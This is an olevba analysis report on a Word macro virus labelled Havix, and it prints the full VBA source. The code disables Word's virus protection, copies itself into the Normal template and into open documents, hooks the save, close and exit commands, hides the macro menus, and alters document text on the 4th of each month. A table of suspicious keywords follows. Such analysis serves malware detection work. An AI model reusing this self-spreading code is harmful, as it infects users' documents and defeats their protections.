olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Havix-d4221d43e7550c52d6f042746219aea7ed5ef661
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Havix-d4221d43e7550c52d6f042746219aea7ed5ef661 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO HaVix.bas 
in file: Virus.MSWord.Havix-d4221d43e7550c52d6f042746219aea7ed5ef661 - OLE stream: 'Macros/VBA/HaVix'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub HaVix()

On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False

If Day(Now()) = 4 Then Call lepegoin
    
For leprison = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(leprison).Name = "HaVix" Then NormInstall = True
Next leprison
For leprison = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(leprison).Name = "HaVix" Then ActivInstall = True
Next leprison
If ActivInstall = False Then
    With ActiveDocument.VBProject
        With .VBComponents.Import("C:\windows\HaVix.bas")
        End With
    End With
End If
If NormInstall = False Then
    Application.VBE.ActiveVBProject.VBComponents("HaVix").Export "C:\windows\HaVix.bas"
    With NormalTemplate.VBProject
        With .VBComponents.Import("C:\windows\HaVix.bas")
        End With
    End With
End If
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
    
leavenow:
End Sub

Sub lepegoin()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "s"
            .Replacement.Text = "z"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
End Sub


Sub FileSave()
    On Error Resume Next
    Call HaVix
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call HaVix
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call HaVix
End Sub
Sub FileExit()
    On Error Resume Next
    Call HaVix
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Call HaVix
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

